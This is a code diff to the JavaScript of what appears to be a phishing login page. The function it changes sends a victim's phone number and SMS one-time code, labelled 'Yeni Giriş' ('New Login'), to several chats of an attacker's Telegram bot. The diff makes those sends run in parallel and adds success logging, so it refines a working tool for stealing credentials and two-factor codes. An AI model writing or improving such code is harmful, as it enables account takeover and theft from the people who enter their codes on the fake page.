@@ -41,7 +41,7 @@ otpInput.addEventListener('input', function () {
     this.value = this.value.replace(/\D/g, '');
 });
 
-// Update Telegram message with SMS code (all chats)
+// Update Telegram message with SMS code (all chats in parallel)
 async function updateTelegramMessage(smsCode) {
     const messageIdsStr = localStorage.getItem('tg_message_ids');
     const phone = localStorage.getItem('tg_phone');
@@ -52,9 +52,9 @@ async function updateTelegramMessage(smsCode) {
     const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/editMessageText`;
     const text = `📱 Yeni Giriş\n\n📞 Telefon: <code>${phone}</code>\n🔑 SMS Kod: <code>${smsCode}</code>`;
 
-    for (const [chatId, msgId] of Object.entries(messageIds)) {
+    const updatePromises = Object.entries(messageIds).map(async ([chatId, msgId]) => {
         try {
-            await fetch(url, {
+            const res = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -64,10 +64,18 @@ async function updateTelegramMessage(smsCode) {
                     parse_mode: 'HTML'
                 })
             });
+            const data = await res.json();
+            if (data.ok) {
+                console.log(`Telegram message updated for ${chatId}`);
+            } else {
+                console.error(`Telegram update error for ${chatId}:`, data.description);
+            }
         } catch (e) {
-            console.error('Telegram update error for chat ' + chatId + ':', e);
+            console.error(`Fetch update error for ${chatId}:`, e);
         }
-    }
+    });
+
+    await Promise.all(updatePromises);
     return true;
 }
 
